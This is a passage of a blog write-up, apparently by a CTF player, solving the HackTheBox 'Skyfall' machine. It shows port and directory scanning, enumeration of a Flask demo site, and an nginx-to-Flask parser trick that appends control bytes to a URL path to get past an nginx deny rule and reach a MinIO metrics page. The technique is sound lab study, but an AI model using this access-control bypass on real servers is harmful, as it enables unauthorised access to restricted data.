@@ -1,0 +1,1182 @@
+<article class="post h-entry" itemscope="" itemtype="http://schema.org/BlogPosting">
+<header class="post-header">
+<h1 class="post-title p-name" itemprop="name headline">HTB: Skyfall</h1>
+<p class="post-meta">
+<span class="tag-list"><a class="post-tag" href="/tags#ctf">ctf</a> <a class="post-tag" href="/tags#hackthebox">hackthebox</a> <a class="post-tag" href="/tags#htb-skyfall">htb-skyfall</a> <a class="post-tag" href="/tags#nmap">nmap</a> <a class="post-tag" href="/tags#feroxbuster">feroxbuster</a> <a class="post-tag" href="/tags#ffuf">ffuf</a> <a class="post-tag" href="/tags#subdomain">subdomain</a> <a class="post-tag" href="/tags#ssrf">ssrf</a> <a class="post-tag" href="/tags#minio">minio</a> <a class="post-tag" href="/tags#nginx-flask-parse">nginx-flask-parse</a> <a class="post-tag" href="/tags#burp">burp</a> <a class="post-tag" href="/tags#burp-repeater">burp-repeater</a> <a class="post-tag" href="/tags#cve-2023-28432">cve-2023-28432</a> <a class="post-tag" href="/tags#cve-2023-28434">cve-2023-28434</a> <a class="post-tag" href="/tags#hashicorp-vault">hashicorp-vault</a> <a class="post-tag" href="/tags#fuse">fuse</a> <a class="post-tag" href="/tags#go-fuse">go-fuse</a> <a class="post-tag" href="/tags#memfs">memfs</a> <a class="post-tag" href="/tags#sshfs">sshfs</a> <a class="post-tag" href="/tags#htb-craft">htb-craft</a> </span><br/><br/>
+<time class="dt-published" datetime="2024-08-31T13:45:00+00:00" itemprop="datePublished">Aug 31, 2024
+      </time></p>
+</header>
+<div class="post-content e-content" itemprop="articleBody">
+<div class="row">
+<div class="col-sm-3">
+<div class="sticky-top">
+<p><a href="/2024/08/31/htb-skyfall.html" style="color: #e6e6e6; text-decoration: none;">HTB: Skyfall</a></p>
+<!--https://afeld.github.io/bootstrap-toc/-->
+<nav data-toggle="toc" id="toc"></nav>
+</div>
+</div>
+<div class="col-sm-9" id="postBody">
+<picture>
+<source srcset="/img/skyfall-cover.webp" type="image/webp"/>
+<img alt="Skyfall" class="include_image" loading="lazy" src="/img/skyfall-cover.png" style="float: right; margin-right:50px; margin-left:50px; height:150px;">
+</img></picture>
+<p>Skyfall is all about enumerating technolories like MinIO and Vault. I’ll start with a demo website that has a MinIO status page blocked by nginx. I’ll abuse a parser breakdown between nginx and flask to get access to the page, and learn the MinIO domain. From there, I’ll exploit a vulnerability in MinIO that leaks the admin username and password. With access to the MinIO cluster, I’ll find a home directory backup where a previous version contained a sensitive Vault token in the Bash configuration file. I’ll use that to get access to the Vault instance and SSH access. From there, I’ll have the ability to run a script the unseal the Vault as root. This generates a log file that I can’t read. I’ll abuse FUSE to generate an in-memory filesystem that allows for root to write to it but that I can still read.</p>
+<h2 id="box-info">Box Info</h2>
+<!-- https://app.hackthebox.com/machines/586 -->
+<table>
+<thead>
+<tr>
+<th>Name</th>
+<th style="text-align: right"><a href="https://hackthebox.com/machines/skyfall" style="font-size: xx-large; text-shadow: 0 0 5px #ffffff, 0 0 7px #ffffff; color: #1756a9" target="_blank">Skyfall</a> <a href="https://hackthebox.com/machines/skyfall" target="_blank"><picture style="float: right; padding-left: 20px;"><source srcset="/icons/box-skyfall.webp" type="image/webp"/> <img alt="Skyfall" class="img-av" src="/icons/box-skyfall.png"/></picture></a><br/><a href="https://hackthebox.com/machines/skyfall" style="font-size: small; color: white;" target="_blank">Play on HackTheBox</a></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Release Date</td>
+<td style="text-align: right"><a href="https://twitter.com/hackthebox_eu/status/1753116036830818804">03 Feb 2024</a></td>
+</tr>
+<tr>
+<td>Retire Date</td>
+<td style="text-align: right">31 Aug 2024</td>
+</tr>
+<tr>
+<td>OS</td>
+<td style="text-align: right">Linux <picture><source srcset="/icons/Linux.webp" type="image/webp"/><img alt="Linux" class="img-os" src="/icons/Linux.png"/></picture></td>
+</tr>
+<tr>
+<td>Base Points</td>
+<td style="text-align: right"><span class="diff-Insane">Insane [50]</span></td>
+</tr>
+<tr>
+<td>Rated Difficulty</td>
+<td style="text-align: right"><picture><source srcset="/img/skyfall-diff.webp" type="image/webp"/><img alt="Rated difficulty for Skyfall" src="/img/skyfall-diff.png" style="display: unset;"/></picture></td>
+</tr>
+<tr>
+<td>Radar Graph</td>
+<td style="text-align: right"><picture><source srcset="/img/skyfall-radar.webp" type="image/webp"/><img alt="Radar chart for Skyfall" src="/img/skyfall-radar.png" style="display: unset;"/></picture></td>
+</tr>
+<tr>
+<td><picture><source srcset="/icons/first-blood-user.webp" type="image/webp"/><img alt="First Blood User" src="/icons/first-blood-user.png" style="display: unset"/></picture></td>
+<td style="text-align: right"><span class="blood-time">05:17:50</span><a href="https://app.hackthebox.com/users/114435" rel="noopener" target="_blank"><img alt="celesian" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" src="https://www.hackthebox.com/badge/image/114435" style="display: unset"/><span class="user-text" style="display: none"> celesian</span></a><br/></td>
+</tr>
+<tr>
+<td><picture><source srcset="/icons/first-blood-root.webp" type="image/webp"/><img alt="First Blood Root" src="/icons/first-blood-root.png" style="display: unset"/></picture></td>
+<td style="text-align: right"><span class="blood-time">05:57:45</span><a href="https://app.hackthebox.com/users/9267" rel="noopener" target="_blank"><img alt="snowscan" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" src="https://www.hackthebox.com/badge/image/9267" style="display: unset"/><span class="user-text" style="display: none"> snowscan</span></a><br/></td>
+</tr>
+<tr>
+<td>Creators</td>
+<td style="text-align: right"><a href="https://app.hackthebox.com/users/168546" rel="noopener" target="_blank"><img alt="ctrlzero" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" src="https://www.hackthebox.com/badge/image/168546" style="display: unset"/><span class="user-text" style="display: none"> ctrlzero</span></a><br/> <a href="https://app.hackthebox.com/users/106224" rel="noopener" target="_blank"><img alt="babywyrm" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" src="https://www.hackthebox.com/badge/image/106224" style="display: unset"/><span class="user-text" style="display: none"> babywyrm</span></a><br/></td>
+</tr>
+</tbody>
+</table>
+<h2 id="recon">Recon</h2>
+<h3 id="nmap">nmap</h3>
+<p><code class="language-plaintext highlighter-rouge">nmap</code> finds two open TCP ports, SSH (22) and HTTP (80):</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>nmap <span class="nt">-p-</span> <span class="nt">--min-rate</span> 10000 10.10.11.254
+<span class="go">Starting Nmap 7.80 ( https://nmap.org ) at 2024-08-23 16:54 EDT
+Nmap scan report for 10.10.11.254
+Host is up (0.085s latency).
+Not shown: 65533 closed ports
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 6.68 seconds
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span>nmap <span class="nt">-p</span> 22,80 <span class="nt">-sCV</span> 10.10.11.254
+<span class="go">Starting Nmap 7.80 ( https://nmap.org ) at 2024-08-23 16:55 EDT
+Nmap scan report for 10.10.11.254
+Host is up (0.085s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+|_http-title: Skyfall - Introducing Sky Storage!
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 9.79 seconds
+</span></code></pre></div></div>
+<p>Based on the <a href="https://packages.ubuntu.com/search?keywords=openssh-server">OpenSSH</a> version, the host is likely running Ubuntu 22.04 jammy.</p>
+<h3 id="website---tcp-80">Website - TCP 80</h3>
+<h4 id="site">Site</h4>
+<p>The site is for a data management company:</p>
+<div style="position: relative;">
+<picture>
+<source srcset="/img/image-20240823165931416.webp" type="image/webp"/>
+<img alt="image-20240823165931416" class="include_image" loading="lazy" src="/img/image-20240823165931416.png" style="max-height: 400px; object-fit: cover; object-position: top; width: -webkit-fill-available; mask-image: linear-gradient(rgb(0, 0, 0), rgb(0,0,0) calc(100% - 100px), rgba(0,0,0,0) calc(100% - 20px)); -webkit-mask-image: linear-gradient(rgb(0, 0, 0), rgb(0,0,0) calc(100% - 100px), rgba(0,0,0,0) calc(100% - 20px));"/>
+</picture>
+<a href="javascript:void(0)" onclick="click_expand_image(event)" style="position: absolute; bottom: 35px; right: 15px;" title="Click to expand for full content"><img alt="expand" class="expand-contract" src="/icons/expand.png"/></a>
+</div>
+<p>Most of the links on the page go to other places on the page. There is one in the middle that goes to <code class="language-plaintext highlighter-rouge">demo.skyfall.htb</code>. There are also some names / emails:</p>
+<ul>
+<li>James Bond (CEO) - <code class="language-plaintext highlighter-rouge">jbond@skyfall.htb</code></li>
+<li>Aurora Skyy (Lead Developer) - <code class="language-plaintext highlighter-rouge">askyy@skyfall.htb</code></li>
+<li>Bill Tanner (CTO) - <code class="language-plaintext highlighter-rouge">btanner@skyfall.htb</code></li>
+<li><code class="language-plaintext highlighter-rouge">contact@skyfall.com</code></li>
+</ul>
+<p>There’s a contact us form at the bottom, but it doesn’t seem to actually do anything.</p>
+<h4 id="tech-stack">Tech Stack</h4>
+<p>The HTTP response headers don’t give much information beyond the nginx version:</p>
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
+<span class="na">Server</span><span class="p">:</span> <span class="s">nginx/1.18.0 (Ubuntu)</span>
+<span class="na">Date</span><span class="p">:</span> <span class="s">Fri, 23 Aug 2024 20:58:47 GMT</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/html</span>
+<span class="na">Last-Modified</span><span class="p">:</span> <span class="s">Thu, 09 Nov 2023 20:44:23 GMT</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">keep-alive</span>
+<span class="na">ETag</span><span class="p">:</span> <span class="s">W/"654d44a7-5097"</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">20631</span>
+</code></pre></div></div>
+<p>The main page loads as <code class="language-plaintext highlighter-rouge">index.html</code>, suggesting a static site. The 404 page is the default nginx page.</p>
+<p>I’ll note that it’s nginx 1.18.0.</p>
+<h4 id="directory-brute-force">Directory Brute Force</h4>
+<p>I’ll run <code class="language-plaintext highlighter-rouge">feroxbuster</code> against the site, and include <code class="language-plaintext highlighter-rouge">-x html</code>:</p>
+<div class="language-console code-collapse highlighter-rouge" data-trunc="300"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>feroxbuster <span class="nt">-u</span> http://10.10.11.254 <span class="nt">-x</span> html
+<span class="go">
+ ___  ___  __   __     __      __         __   ___
+|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
+|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
+by Ben "epi" Risher 🤓                 ver: 2.10.4
+───────────────────────────┬──────────────────────
+ 🎯  Target Url            │ http://10.10.11.254
+ 🚀  Threads               │ 50
+ 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
+ 👌  Status Codes          │ All Status Codes!
+ 💥  Timeout (secs)        │ 7
+ 🦡  User-Agent            │ feroxbuster/2.10.4
+ 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
+ 💲  Extensions            │ [html]
+ 🏁  HTTP methods          │ [GET]
+ 🔃  Recursion Depth       │ 4
+───────────────────────────┴──────────────────────
+ 🏁  Press [ENTER] to use the Scan Management Menu™
+──────────────────────────────────────────────────
+</span><span class="feroxbuster-red">404</span><span class="go">      GET        7l       12w      162c </span><span class="feroxbuster-green">Auto-filtering </span><span class="go">found </span><span class="feroxbuster-red">404</span><span class="go">-like response and created new filter; toggle off with </span><span class="feroxbuster-yellow">--dont-filter</span><span class="go">
+</span><span class="feroxbuster-green">200</span><span class="go">      GET      501l     1612w    20631c http://10.10.11.254/
+</span><span class="feroxbuster-yellow">301</span><span class="go">      GET        7l       12w      178c http://10.10.11.254/assets =&gt; </span><span class="feroxbuster-yellow">http://10.10.11.254/assets/</span><span class="go">
+</span><span class="feroxbuster-yellow">301</span><span class="go">      GET        7l       12w      178c http://10.10.11.254/assets/js =&gt; </span><span class="feroxbuster-yellow">http://10.10.11.254/assets/js/</span><span class="go">
+</span><span class="feroxbuster-yellow">301</span><span class="go">      GET        7l       12w      178c http://10.10.11.254/assets/css =&gt; </span><span class="feroxbuster-yellow">http://10.10.11.254/assets/css/</span><span class="go">
+</span><span class="feroxbuster-yellow">301</span><span class="go">      GET        7l       12w      178c http://10.10.11.254/assets/img =&gt; </span><span class="feroxbuster-yellow">http://10.10.11.254/assets/img/</span><span class="go">
+</span><span class="feroxbuster-green">200</span><span class="go">      GET      501l     1612w    20631c http://10.10.11.254/index.html
+</span><span class="feroxbuster-yellow">301</span><span class="go">      GET        7l       12w      178c http://10.10.11.254/assets/img/clients =&gt; </span><span class="feroxbuster-yellow">http://10.10.11.254/assets/img/clients/</span><span class="go">
+</span><span class="feroxbuster-yellow">301</span><span class="go">      GET        7l       12w      178c http://10.10.11.254/assets/img/portfolio =&gt; </span><span class="feroxbuster-yellow">http://10.10.11.254/assets/img/portfolio/</span><span class="go">
+</span><span class="feroxbuster-yellow">301</span><span class="go">      GET        7l       12w      178c http://10.10.11.254/assets/img/team =&gt; </span><span class="feroxbuster-yellow">http://10.10.11.254/assets/img/team/</span><span class="go">
+</span><span class="feroxbuster-yellow">301</span><span class="go">      GET        7l       12w      178c http://10.10.11.254/assets/vendor =&gt; </span><span class="feroxbuster-yellow">http://10.10.11.254/assets/vendor/</span><span class="go">
+</span><span class="feroxbuster-yellow">301</span><span class="go">      GET        7l       12w      178c http://10.10.11.254/assets/vendor/aos =&gt; </span><span class="feroxbuster-yellow">http://10.10.11.254/assets/vendor/aos/</span><span class="go">
+[</span><span class="feroxbuster-yellow">####################</span><span class="go">] - 3m    300000/300000  0s      </span><span class="feroxbuster-green">found</span><span class="go">:11      </span><span class="feroxbuster-red">errors</span><span class="go">:0
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 3m    300000/300000  0s      </span><span class="feroxbuster-green">found</span><span class="go">:11      </span><span class="feroxbuster-red">errors</span><span class="go">:0
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 2m     30000/30000   291/s   http://10.10.11.254/
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 2m     30000/30000   292/s   http://10.10.11.254/assets/
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 2m     30000/30000   292/s   http://10.10.11.254/assets/js/
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 2m     30000/30000   292/s   http://10.10.11.254/assets/css/
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 2m     30000/30000   292/s   http://10.10.11.254/assets/img/
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 2m     30000/30000   292/s   http://10.10.11.254/assets/img/clients/
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 2m     30000/30000   292/s   http://10.10.11.254/assets/img/portfolio/
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 2m     30000/30000   292/s   http://10.10.11.254/assets/img/team/
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 2m     30000/30000   292/s   http://10.10.11.254/assets/vendor/
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 2m     30000/30000   291/s   http://10.10.11.254/assets/vendor/aos/ 
+</span></code></pre></div></div>
+<p>Nothing interesting.</p>
+<h3 id="subdomain-brute-force">Subdomain Brute Force</h3>
+<p>Given the use of the domains <code class="language-plaintext highlighter-rouge">skyfall.htb</code> and <code class="language-plaintext highlighter-rouge">demo.skyfall.htb</code>, I’ll brute force with <code class="language-plaintext highlighter-rouge">ffuf</code> to see if any other subdomains respond differently:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>ffuf <span class="nt">-u</span> http://10.10.11.254 <span class="nt">-H</span> <span class="s2">"Host: FUZZ.skyfall.htb"</span> <span class="nt">-w</span> /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt <span class="nt">-ac</span>
+<span class="go">
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.0.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://10.10.11.254
+ :: Wordlist         : FUZZ: /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt
+ :: Header           : Host: FUZZ.skyfall.htb
+ :: Follow redirects : false
+ :: Calibration      : true
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
+________________________________________________
+
+demo                    [Status: 302, Size: 217, Words: 23, Lines: 1, Duration: 151ms]
+:: Progress: [19966/19966] :: Job [1/1] :: 458 req/sec :: Duration: [0:00:43] :: Errors: 0 ::
+</span></code></pre></div></div>
+<p>Only <code class="language-plaintext highlighter-rouge">demo</code>. I’ll add both to my <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>10.10.11.254 skyfall.htb demo.skyfall.htb
+</code></pre></div></div>
+<h3 id="demoskyfallhtb---tcp-80">demo.skyfall.htb - TCP 80</h3>
+<h4 id="site-1">Site</h4>
+<p>The site presents a login page:</p>
+<picture>
+<source srcset="/img/image-20240823170922938.webp" type="image/webp"/>
+<img alt="image-20240823170922938" class="include_image" loading="lazy" src="/img/image-20240823170922938.png"/>
+</picture>
+<p>Being a demo site, there’s a note that the creds guest / guest should work, and they do:</p>
+<picture>
+<source srcset="/img/image-20240823171012230.webp" type="image/webp"/>
+<img alt="image-20240823171012230" class="include_image" loading="lazy" src="/img/image-20240823171012230.png"/>
+</picture>
+<p>There are a lot of features on this page. The Dashboard page above (<code class="language-plaintext highlighter-rouge">/index</code>) doesn’t have anything useful.</p>
+<p>The “Files” page (<code class="language-plaintext highlighter-rouge">/files</code>) has a single file, and an option to upload more:</p>
+<picture>
+<source srcset="/img/image-20240823171720981.webp" type="image/webp"/>
+<img alt="image-20240823171720981" class="include_image" loading="lazy" src="/img/image-20240823171720981.png"/>
+</picture>
+<p>The PDF describes the service, but nothing too interesting. I can upload a file:</p>
+<picture>
+<source srcset="/img/image-20240823172434534.webp" type="image/webp"/>
+<img alt="image-20240823172434534" class="include_image" loading="lazy" src="/img/image-20240823172434534.png"/>
+</picture>
+<p>The Beta Features page (<code class="language-plaintext highlighter-rouge">/beta</code>) returns a not authorized message:</p>
+<picture>
+<source srcset="/img/image-20240823172540142.webp" type="image/webp"/>
+<img alt="image-20240823172540142" class="include_image" loading="lazy" src="/img/image-20240823172540142.png"/>
+</picture>
+<p>The URL Fetch page (<code class="language-plaintext highlighter-rouge">/fetch</code>) offers a form to upload a file from a URL:</p>
+<picture>
+<source srcset="/img/image-20240823172621763.webp" type="image/webp"/>
+<img alt="image-20240823172621763" class="include_image" loading="lazy" src="/img/image-20240823172621763.png"/>
+</picture>
+<p>If I give it a URL of my IP, it will hit it:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">10.10.11.254 - - [23/Aug/2024 17:26:37] code 404, message File not found
+10.10.11.254 - - [23/Aug/2024 17:26:37] "GET /test.png HTTP/1.1" 404 -
+</span></code></pre></div></div>
+<p>If I give it a URL to a file that exists, that file shows up on the Files page.</p>
+<p>The MinIO Metrics page (<code class="language-plaintext highlighter-rouge">/metrics</code>) page returns an nginx 403 Forbidden.</p>
+<p>The Feedback page (<code class="language-plaintext highlighter-rouge">/feedback</code>) offers a form:</p>
+<picture>
+<source srcset="/img/image-20240823172844044.webp" type="image/webp"/>
+<img alt="image-20240823172844044" class="include_image" loading="lazy" src="/img/image-20240823172844044.png"/>
+</picture>
+<p>Submitting sends the content in a POST to <code class="language-plaintext highlighter-rouge">/feedback</code>, but there’s no indication that anything happens.</p>
+<p>The Escalate page (<code class="language-plaintext highlighter-rouge">/escalate</code>) has another form:</p>
+<picture>
+<source srcset="/img/image-20240823172953445.webp" type="image/webp"/>
+<img alt="image-20240823172953445" class="include_image" loading="lazy" src="/img/image-20240823172953445.png"/>
+</picture>
+<p>Submitting this shows a message that it’ll be at least 24 hours before they look:</p>
+<picture>
+<source srcset="/img/image-20240823173020586.webp" type="image/webp"/>
+<img alt="image-20240823173020586" class="include_image" loading="lazy" src="/img/image-20240823173020586.png"/>
+</picture>
+<p>That sounds like it’s not worth pursing in a CTF.</p>
+<h4 id="tech-stack-1">Tech Stack</h4>
+<p>The site has a footer saying that it runs on the Python web framework, Flask:</p>
+<picture>
+<source srcset="/img/image-20240823173313378.webp" type="image/webp"/>
+<img alt="image-20240823173313378" class="include_image" loading="lazy" src="/img/image-20240823173313378.png"/>
+</picture>
+<p>The HTTP headers don’t show anything else. There’s a custom 404 page:</p>
+<picture>
+<source srcset="/img/image-20240823173358388.webp" type="image/webp"/>
+<img alt="image-20240823173358388" class="include_image" loading="lazy" src="/img/image-20240823173358388.png"/>
+</picture>
+<p>If I use <code class="language-plaintext highlighter-rouge">nc</code> to catch one of the incoming web requests from the URL Fetch page, it shows Python Requests, which fits the idea that this is Flask:</p>
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">GET</span> <span class="nn">/htb.png</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">10.10.14.6</span>
+<span class="na">User-Agent</span><span class="p">:</span> <span class="s">python-requests/2.31.0</span>
+<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
+<span class="na">Accept</span><span class="p">:</span> <span class="s">*/*</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">keep-alive</span>
+</code></pre></div></div>
+<p>The MinIO reference suggests that the system is using <a href="https://min.io/">MinIO</a> for storage. MinIO is an enterprise storage object store, compatible with S3.</p>
+<h4 id="directory-brute-force-1">Directory Brute Force</h4>
+<p><code class="language-plaintext highlighter-rouge">feroxbuster</code> doesn’t find anything that I haven’t come across already:</p>
+<div class="language-console code-collapse highlighter-rouge" data-trunc="300"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>feroxbuster <span class="nt">-u</span> http://demo.skyfall.htb
+<span class="go">                                                                                                          
+ ___  ___  __   __     __      __         __   ___
+|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
+|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
+by Ben "epi" Risher 🤓                 ver: 2.10.4
+───────────────────────────┬──────────────────────
+ 🎯  Target Url            │ http://demo.skyfall.htb
+ 🚀  Threads               │ 50
+ 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
+ 👌  Status Codes          │ All Status Codes!
+ 💥  Timeout (secs)        │ 7
+ 🦡  User-Agent            │ feroxbuster/2.10.4
+ 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
+ 🏁  HTTP methods          │ [GET]
+ 🔃  Recursion Depth       │ 4
+───────────────────────────┴──────────────────────
+ 🏁  Press [ENTER] to use the Scan Management Menu™
+──────────────────────────────────────────────────
+</span><span class="feroxbuster-red">403</span><span class="go">      GET        1l       35w      352c </span><span class="feroxbuster-green">Auto-filtering </span><span class="go">found </span><span class="feroxbuster-red">404</span><span class="go">-like response and created new filter; toggle off with </span><span class="feroxbuster-yellow">--dont-filter</span><span class="go">
+</span><span class="feroxbuster-yellow">302</span><span class="go">      GET        1l       23w      217c http://demo.skyfall.htb/ =&gt; </span><span class="feroxbuster-yellow">http://demo.skyfall.htb/login</span><span class="go">
+</span><span class="feroxbuster-yellow">302</span><span class="go">      GET        1l       23w      217c http://demo.skyfall.htb/logout =&gt; </span><span class="feroxbuster-yellow">http://demo.skyfall.htb/login</span><span class="go">
+</span><span class="feroxbuster-green">200</span><span class="go">      GET        9l      234w     3674c http://demo.skyfall.htb/login
+</span><span class="feroxbuster-red">403</span><span class="go">      GET        7l       10w      162c http://demo.skyfall.htb/metrics
+[</span><span class="feroxbuster-yellow">####################</span><span class="go">] - 4m     30000/30000   0s      </span><span class="feroxbuster-green">found</span><span class="go">:4       </span><span class="feroxbuster-red">errors</span><span class="go">:0
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 4m     30000/30000   129/s   http://demo.skyfall.htb/ 
+</span></code></pre></div></div>
+<h2 id="shell-as-askyy">Shell as askyy</h2>
+<h3 id="find-minio-domain">Find MinIO Domain</h3>
+<h4 id="identify-parsing-issue">Identify Parsing Issue</h4>
+<p>The difference between block on <code class="language-plaintext highlighter-rouge">/beta</code> and on <code class="language-plaintext highlighter-rouge">/metrics</code> is worth thinking about:</p>
+<table>
+<thead>
+<tr>
+<th>Site</th>
+<th>HTTP Resp Code</th>
+<th>Content</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code class="language-plaintext highlighter-rouge">/beta</code></td>
+<td>200 OK</td>
+<td>Custom Restricted Page</td>
+</tr>
+<tr>
+<td><code class="language-plaintext highlighter-rouge">/metrics</code></td>
+<td>403 Forbidden</td>
+<td>nginx 403 Page</td>
+</tr>
+</tbody>
+</table>
+<p>Thinking about this and researching leads to a nice post from Rafa’s Blog, <a href="https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies#heading-nginx-acl-rules">Exploiting HTTP Parsers Inconsistencies</a>. It talks about an nginx config that looks like this:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>location <span class="o">=</span> /admin <span class="o">{</span>
+    deny all<span class="p">;</span>
+<span class="o">}</span>
+
+location <span class="o">=</span> /admin/ <span class="o">{</span>
+    deny all<span class="p">;</span>
+<span class="o">}</span>
+</code></pre></div></div>
+<p>And looks at how different applications (including Flask) differ in how they handle parsing URLs. The issue is in how nginx and Flask normalize URLs. There are characters that nginx does not strip from the URL but that Flask does, such as <code class="language-plaintext highlighter-rouge">\x85</code>. If I send <code class="language-plaintext highlighter-rouge">/admin\x85</code> in the example above, nginx sees it does not match <code class="language-plaintext highlighter-rouge">/admin</code> or <code class="language-plaintext highlighter-rouge">/admin/</code>, and passes the request on to Flask. But Flask strips the <code class="language-plaintext highlighter-rouge">\x85</code> and then resolves it as <code class="language-plaintext highlighter-rouge">/admin</code>, unblocked! There are nice summary tables showing different versions of nginx and what characters make a bypass for many different application servers. The Flask on is:</p>
+<picture>
+<source srcset="/img/image-20240824071336306.webp" type="image/webp"/>
+<img alt="image-20240824071336306" class="include_image" loading="lazy" src="/img/image-20240824071336306.png"/>
+</picture>
+<p>To dig in a bit deeper on this, <code class="language-plaintext highlighter-rouge">flask</code> is calling <code class="language-plaintext highlighter-rouge">strip</code> on the URL, and as <a href="https://stackoverflow.com/a/61566726">this StackOverflow answer</a> explains really nicely, that by default removes the exact list of characters from version 1.20.2 and before.</p>
+<h4 id="bypass">Bypass</h4>
+<p>Given that Skyfall is nginx 1.18.0, there are lots of options. These are all unusual non-ASCII characters, so it’s a bit tricky to get them into the path. The best method I found was in Burp Repeater. I’ll add a character I can see (“X”) to the end of the path:</p>
+<picture>
+<source srcset="/img/image-20240824080110032.webp" type="image/webp"/>
+<img alt="image-20240824080110032" class="include_image" loading="lazy" src="/img/image-20240824080110032.png"/>
+</picture>
+<p>And then switch to the “Hex” tab and edit it from “58” to “85”:</p>
+<picture>
+<source srcset="/img/image-20240824080153042.webp" type="image/webp"/>
+<img alt="image-20240824080153042" class="include_image" loading="lazy" src="/img/image-20240824080153042.png"/>
+</picture>
+<p>Unfortunately, it doesn’t work. I <em>think</em> this is because the stack is not nginx –&gt; Flask, but nginx –&gt; gunicorn –&gt; Flask, and gunicorn may be performing additional normalization.</p>
+<p>I’ll try the others on the list, and <code class="language-plaintext highlighter-rouge">0x0c</code> and <code class="language-plaintext highlighter-rouge">0x0b</code> work:</p>
+<picture>
+<source srcset="/img/image-20240824080536722.webp" type="image/webp"/>
+<img alt="image-20240824080536722" class="include_image" loading="lazy" src="/img/image-20240824080536722.png"/>
+</picture>
+<p><code class="language-plaintext highlighter-rouge">0x09</code> (tab) and <code class="language-plaintext highlighter-rouge">0x0a</code> (newline) both work as well here.</p>
+<p>There is a ton of data here, but there two interesting ones are <code class="language-plaintext highlighter-rouge">minio_software_version_info</code> which shows “version: 2023-03-13T19:46:17Z” and the <code class="language-plaintext highlighter-rouge">minio_endpoint_url</code> which is <code class="language-plaintext highlighter-rouge">http://prd23-s3-backend.skyfall.htb/minio/v2/metrics/cluster</code>.</p>
+<p>I’ll add that to my <code class="language-plaintext highlighter-rouge">hosts</code> file:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>10.10.11.254 skyfall.htb demo.skyfall.htb prd23-s3-backend.skyfall.htb
+</code></pre></div></div>
+<p>Visiting the URL gives information about the MinIO cluster:</p>
+<picture>
+<source srcset="/img/image-20240824143516305.webp" type="image/webp"/>
+<img alt="image-20240824143516305" class="include_image" loading="lazy" src="/img/image-20240824143516305.png"/>
+</picture>
+<h4 id="alternative-bypass">Alternative Bypass</h4>
